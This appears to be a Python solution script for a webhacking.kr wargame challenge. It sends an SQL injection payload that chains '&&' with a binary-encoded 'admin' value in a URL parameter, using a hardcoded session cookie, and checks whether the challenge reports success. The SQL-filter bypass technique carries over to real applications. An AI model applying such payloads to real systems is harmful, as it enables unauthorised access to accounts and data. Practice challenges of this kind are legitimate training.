import requests

url = "https://webhacking.kr/challenge/web-23/?"
cookie = {"PHPSESSID":"hjb4hev90d5u7q3ejvvgigllgq"}

def solve():
    payload = "lv=1%26%26id%3d0b0110000101100100011011010110100101101110"
    res = requests.get(url=url+payload, cookies=cookie)
    if "old-46 Pwned!" in res.text:
        print("old-46 Pwned!")
    elif "already solve" in res.text:
        print("already solve")

if __name__ == "__main__":
    solve()